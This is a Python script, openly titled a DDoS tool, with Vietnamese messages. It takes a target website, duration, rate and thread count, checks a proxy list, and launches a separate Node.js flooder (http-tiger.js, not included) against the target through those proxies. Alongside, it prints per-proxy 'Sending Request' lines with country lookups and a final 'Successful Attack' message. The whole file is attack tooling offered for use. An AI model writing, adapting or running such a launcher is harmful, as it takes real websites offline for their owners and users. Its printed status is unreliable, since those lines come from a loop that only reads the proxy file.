
import argparse
import subprocess
import time
import requests
import sys
import random
from datetime import datetime
import threading
import os
import re

def remove_port__(proxy):
    proxy_parts = proxy.split(':')
    if len(proxy_parts) == 2:
        return proxy_parts[0]
    return proxy

def country_target____(proxyhttp):
    try:
        url = f"http://ip-api.com/json/{proxyhttp}"
        response = requests.get(url, timeout=5)
        data = response.json()
        return data.get("country", "Unknown")
    except:
        return "Unknown"

def create_proxy_file_if_not_exists():
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", "w") as proxy_file:
            proxy_file.write("# Add your proxies here in format ip:port\n")
            proxy_file.write("# Example: 103.167.22.58:80\n")
        print("Đã tạo file proxy.txt. Vui lòng thêm proxy vào file để sử dụng!")
        sys.exit()
    elif os.path.exists("proxy.txt") and os.path.getsize("proxy.txt") == 0:
        print("Lỗi: Vui lòng thêm proxy vào file proxy.txt để sử dụng ddos tool!")
        sys.exit()
    else:
        # Check if file has valid proxies
        valid_proxies = []
        with open("proxy.txt", "r") as proxy_file:
            for line in proxy_file:
                proxy = line.strip()
                if proxy and not proxy.startswith('#'):
                    if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):
                        valid_proxies.append(proxy)
                    else:
                        print(f"Lỗi: Proxy '{proxy}' không đúng định dạng. Vui lòng nhập đúng định dạng ip:port ví dụ: 103.167.22.58:80")
                        sys.exit()
        
        if not valid_proxies:
            print("Lỗi: Không tìm thấy proxy hợp lệ trong file proxy.txt!")
            sys.exit()

def run_ddos(args, process):
    start_time = time.time()

    while True:
        current_time = time.time()
        elapsed_time = current_time - start_time
        if elapsed_time >= args.time:
            try:
                process.terminate()
            except:
                pass
            break
            
        try:
            with open("proxy.txt", "r") as proxy_file:
                for line in proxy_file:
                    proxy = line.strip()
                    if proxy and not proxy.startswith('#'):
                        proxy_ip = remove_port__(proxy)
                        country_target = country_target____(proxy_ip)
                        
                        current_time_str = datetime.now().strftime("%H:%M:%S")
                        print(f"[{current_time_str}] Method POST - Target: {args.website}:443 || IP: {proxy_ip} || Country: {country_target} || Status: Sending Request To Server")
                        
                        elapsed_time = time.time() - start_time
                        if elapsed_time >= args.time:
                            try:
                                process.terminate()
                            except:
                                pass
                            break
                        
                        time.sleep(0.1)  # Small delay to prevent overwhelming
        except Exception as e:
            print(f"Lỗi khi đọc proxy: {e}")
            break
    
    print(f"Successful Attack URL {args.website} - Time {args.time}s !")
    input("Nhấn Enter để thoát tool.")

def main(args):
    # Check if Node.js is available
    try:
        subprocess.run(["node", "--version"], check=True, capture_output=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("Lỗi: Node.js không được cài đặt. Vui lòng cài đặt Node.js trước.")
        sys.exit(1)
    
    # Check if http-tiger.js exists
    if not os.path.exists("http-tiger.js"):
        print("Lỗi: Không tìm thấy file http-tiger.js")
        sys.exit(1)
    
    node_command = ["node", "http-tiger.js", args.website, str(args.time), str(args.rate), str(args.thread), "proxy.txt"]
    
    try:
        create_proxy_file_if_not_exists()
        
        print(f"Bắt đầu tấn công {args.website} trong {args.time} giây...")
        
        process = subprocess.Popen(
            node_command, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            universal_newlines=True
        )
        
        ddos_thread = threading.Thread(target=run_ddos, args=(args, process))
        ddos_thread.daemon = True
        ddos_thread.start()
        
        # Wait for the attack to complete
        ddos_thread.join(timeout=args.time + 5)
        
        # Ensure process is terminated
        try:
            process.terminate()
            process.wait(timeout=5)
        except:
            try:
                process.kill()
            except:
                pass
        
    except KeyboardInterrupt:
        print("\nTấn công đã bị dừng bởi người dùng.")
        try:
            process.terminate()
        except:
            pass
        sys.exit(0)
    except Exception as e:
        print(f"LỖI: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS tool")
    parser.add_argument("website", help="Target website URL")
    parser.add_argument("time", type=int, help="Attack duration in seconds")
    parser.add_argument("rate", type=int, help="Request rate")
    parser.add_argument("thread", type=int, help="Number of threads")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.time <= 0:
        print("Lỗi: Thời gian phải lớn hơn 0")
        sys.exit(1)
    
    if args.rate <= 0:
        print("Lỗi: Rate phải lớn hơn 0")
        sys.exit(1)
    
    if args.thread <= 0:
        print("Lỗi: Thread phải lớn hơn 0")
        sys.exit(1)
    
    main(args)
